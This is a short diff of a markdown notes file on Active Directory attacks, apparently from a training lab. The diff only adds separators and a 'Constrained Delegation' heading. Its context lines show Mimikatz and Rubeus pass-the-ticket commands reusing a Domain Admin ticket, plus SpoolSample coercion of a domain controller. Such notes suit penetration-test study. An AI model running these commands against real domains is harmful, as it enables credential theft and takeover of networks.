@@ -650,6 +650,9 @@ We can then reuse the DA token:
 ```
 Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
 ```
+
+* * *
+
 #### Rubeus
 ```Get-NetComputer -UnConstrained```
 
@@ -660,3 +663,6 @@ SpoolSample DC01 helpdesk.lab
 Rubeus ptt /ticket:
 klist
 ```
+* * *
+
+# Constrained Delegation
